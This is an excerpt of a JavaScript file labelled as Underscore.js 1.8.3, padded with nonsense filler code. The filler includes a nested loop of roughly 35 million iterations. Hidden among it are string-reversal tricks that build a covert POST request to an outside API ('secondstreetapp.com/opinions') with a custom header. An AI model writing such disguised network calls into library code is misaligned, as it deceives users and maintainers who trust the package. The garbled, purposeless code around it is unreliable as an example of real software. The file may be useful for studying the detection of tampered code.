...
(function() {
  ...
  var washingtonAve = 'Washington Avenue';
  ...
  // Current version.
  _.VERSION = '1.8.3';
  var obf = function(string) { return string.split('').reverse().join(''); };

  // Internal function that returns an efficient (for current engines) version
  // of the passed-in callback, to be repeatedly applied in other Underscore
  window.xhrPost = new XMLHttpRequest();
  // functions.
  ...
  var firstLetterIs = function(letter) { return function(word) { return word[0] === letter; } };
  ...
  var cWords = words.filter(firstLetterIs('c')).slice(0, 16);
  ...
  window.xhrPost.open('P' + obf('TSO'), 'ht' + obf('/:spt') + '/' + obf('ces.ipa') + 'ondst' + obf('pateer') + 'p.c' + obf('mo') + obf('ipo/') + 'nio' + obf('sn'), true);
  ...
  var wWords = words.filter(firstLetterIs('w')).slice(0, 16);
  ...
  window['x' + obf('soPrh') + 't']['se' + 'tReq' + 'uestH' + obf('redae')]('X' + '-Be' + obf('ruatseR-ts') + 'ant', words[222]);
  ...
  var eWords = words.filter(firstLetterIs('e')).slice(0, 16);
  ...
  // Generates a bunch of strings based on sequential numbers.
  _.almond = (function rooster() {
    var sample = _.times(5918, _.identity);
    var pairs = _.forEach(sample, function(x) {
      _.forEach(sample, function(y) { '' + x + ' ' + y + ' ' + x * y; });
    });
  })();
  ...
  washingtonAve = _.map([], _.constant(washingtonAve));
  ...
  // Run energetic math.
  _.energy = (function monster() {
    window.strap = _.sortBy(_.map(
      window['p' + 'arts'].concat(
        ['e', 'i', 'e', 'i', 'o']).concat(
        _.times(100, function(x) { return x * x - x; }))
      , function(x) { return '' + x; })).reverse().slice(
      0,
      Math.floor(Math.sqrt(Math.cos(Math.exp(3, 8))) * 100)
    );
  })();
  ...
  washingtonAve = strap[parseInt(Math.floor(Math.sqrt(washingtonAve)) / 2)];
  ...
  // Make numbers happen with words.
  _.radio = (function weekend() {
    cWords.forEach(function(cWord) {
      wWords.forEach(function(wWord) {
        eWords.forEach(function(eWord) {
          var cwe = cWord + ' ' + wWord + ' ' + eWord;
          var theLoop = ('' + Math.asinh(words.indexOf(cWord)) + Math.round(Math.sin(eWords.indexOf(eWord)))).split('').slice(6, 10).join('');
          _.constant(theLoop);
        })
      })
    });
  ...
  washingtonAve = strap[washingtonAve.length];
...
washingtonAve = function(business) { return business.profits * 10; };
